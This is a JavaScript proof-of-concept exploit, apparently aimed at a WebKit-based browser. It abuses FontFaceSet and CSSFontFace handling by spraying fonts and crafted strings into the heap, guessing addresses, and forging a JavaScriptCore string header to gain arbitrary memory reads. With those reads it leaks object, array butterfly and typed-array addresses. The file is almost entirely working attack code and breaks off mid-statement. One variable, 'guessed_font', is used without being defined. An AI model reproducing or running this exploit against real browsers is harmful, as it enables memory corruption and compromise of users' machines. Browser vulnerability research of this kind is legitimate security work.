const PAGE_SIZE = 16384;
const SIZEOF_CSS_FONT_FACE = 0xb8;
const HASHMAP_BUCKET = 208;
const STRING_OFFSET = 20;
const SPRAY_FONTS = 0x1000;
const GUESS_FONT = 0x200430000;
const NPAGES = 20;
const INVALID_POINTER = 0;
const HAMMER_FONT_NAME = "font8";  // Must take bucket 3 of 8 (counting from zero)
const HAMMER_NSTRINGS = 700;  // Tweak this if crashing during hammer time

function poc() {
  // Helper functions
  const hex = (n) => (typeof n !== "number") ? `${n}` : `0x${(new Number(n)).toString(16)}`;

  const union = new ArrayBuffer(8);
  const union_b = new Uint8Array(union);
  const union_i = new Uint32Array(union);
  const union_f = new Float64Array(union);

  let bad_fonts = [];

  // Spray bad fonts
  for (let i = 0; i < SPRAY_FONTS; i++) {
    bad_fonts.push(new FontFace("font1", "", {}));
  }

  // Add a good font
  const good_font = new FontFace("font2", "url(data:text/html,)", {});
  bad_fonts.push(good_font);

  const arrays = Array.from({ length: 512 }, () => new Array(31));
  arrays[256][0] = 1.5;
  arrays[257][0] = {};
  arrays[258][0] = 1.5;

  const jsvalue = {
    a: arrays[256],
    b: new Uint32Array(1),
    c: true
  };

  const string_atomifier = {};
  let string_id = 10000000;

  const ptrToString = (p) => {
    let s = '';
    for (let i = 0; i < 8; i++) {
      s += String.fromCharCode(p % 256);
      p = Math.floor(p / 256);
    }
    return s;
  };

  const stringToPtr = (p, o = 0) => {
    let ans = 0;
    for (let i = 7; i >= 0; i--) {
      ans = 256 * ans + p.charCodeAt(o + i);
    }
    return ans;
  };

  const mkString = (l, head) => {
    const s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + string_id++;
    string_atomifier[s] = 1;
    return s;
  };

  let guf = GUESS_FONT;
  let ite = true;
  let matches = 0;
  let guessed_addr = null;

  do {
    let p_s = ptrToString(NPAGES + 2); // vector.size()
    for (let i = 0; i < NPAGES; i++) {
      p_s += ptrToString(guf + i * PAGE_SIZE);
    }
    p_s += ptrToString(INVALID_POINTER);

    // Create bad strings
    for (let i = 0; i < 256; i++) {
      mkString(HASHMAP_BUCKET, p_s);
    }

    const ffs = new FontFaceSet(bad_fonts);
    const badstr1 = mkString(HASHMAP_BUCKET, p_s);

    for (let i = 0; i < SPRAY_FONTS; i++) {
      bad_fonts[i].family = "evil";
      if (badstr1.substr(0, p_s.length) !== p_s) {
        const p_s1 = badstr1.substr(0, p_s.length);
        for (let i = 1; i <= NPAGES; i++) {
          if (p_s1.substr(i * 8, 8) !== p_s.substr(i * 8, 8)) {
            guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
            break;
          }
        }
        if (matches++ === 0) {
          guf = guessed_addr + 2 * PAGE_SIZE;
          guessed_addr = null;
        }
        break;
      }
    }

    if ((ite = !ite)) guf += NPAGES * PAGE_SIZE;
  } while (guessed_addr === null);

  let p_s = '';
  p_s += ptrToString(26);
  p_s += ptrToString(guessed_addr);
  p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
  for (let i = 0; i < 19; i++) {
    p_s += ptrToString(INVALID_POINTER);
  }

  // Create more bad strings
  for (let i = 0; i < 256; i++) {
    mkString(HASHMAP_BUCKET, p_s);
  }

  const ffs2 = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
  const badstr2 = mkString(HASHMAP_BUCKET, p_s);
  mkString(HASHMAP_BUCKET, p_s);

  bad_fonts[guessed_font].family = "evil2";
  bad_fonts[guessed_font + 1].family = "evil3";

  const leak = stringToPtr(badstr2.substr(badstr2.length - 8));

  const makeReader = (read_addr, ffs_name) => {
    let fake_s = '0000'; // padding for 8-byte alignment
    fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; // refcount=255, length=0xffffffff
    fake_s += ptrToString(read_addr); // where to read from
    fake_s += ptrToString(0x80000014); // fake non-zero hash, atom, 8-bit

    p_s = '';
    p_s += ptrToString(29);
    p_s += ptrToString(guessed_addr);
    p_s += ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
    p_s += ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
    for (let i = 0; i < 18; i++) {
      p_s += ptrToString(INVALID_POINTER);
    }

    // Create strings
    for (let i = 0; i < 256; i++) {
      mkString(HASHMAP_BUCKET, p_s);
    }

    const the_ffs = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
    mkString(HASHMAP_BUCKET, p_s);
    const relative_read = mkString(HASHMAP_BUCKET, fake_s);
    bad_fonts[guessed_font].family = `${ffs_name}_evil1`;
    bad_fonts[guessed_font + 1].family = `${ffs_name}_evil2`;
    bad_fonts[guessed_font + 2].family = `${ffs_name}_evil3`;

    // Recursive call if failed
    if (relative_read.length < 1000) return makeReader(read_addr, `${ffs_name}_`);
    return relative_read;
  };

  const fastmalloc = makeReader(leak, 'ffs3'); // read from leaked string ptr
  for (let i = 0; i < 100000; i++) {
    mkString(128, '');
  }

  const props = [];
  for (let i = 0; i < 0x10000; i++) {
    props.push({ value: 0x41434442 });
    props.push({ value: jsvalue });
  }

  let jsvalue_leak = null;
  while (jsvalue_leak === null) {
    Object.defineProperties({}, props);
    for (let i = 0;; i++) {
      if (fastmalloc.charCodeAt(i) === 0x42 &&
        fastmalloc.charCodeAt(i + 1) === 0x44 &&
        fastmalloc.charCodeAt(i + 2) === 0x43 &&
        fastmalloc.charCodeAt(i + 3) === 0x41 &&
        fastmalloc.charCodeAt(i + 4) === 0 &&
        fastmalloc.charCodeAt(i + 5) === 0 &&
        fastmalloc.charCodeAt(i + 6) === 254 &&
        fastmalloc.charCodeAt(i + 7) === 255 &&
        fastmalloc.charCodeAt(i + 24) === 14) {
        jsvalue_leak = stringToPtr(fastmalloc, i + 32);
        break;
      }
    }
  }

  const rd_leak = makeReader(jsvalue_leak, 'ffs4');
  const array256 = stringToPtr(rd_leak, 16); // arrays[256]
  const ui32a = stringToPtr(rd_leak, 24); // Uint32Array
  const sanity = stringToPtr(rd_leak, 32);

  const rd_arr = makeReader(array256, 'ffs5');
  const butterfly = stringToPtr(rd_arr, 8);

  const rd_ui32 = makeReader(ui32a, 'ffs6');
  for (let i = 0; i < 8; i++) {
    union_b[i
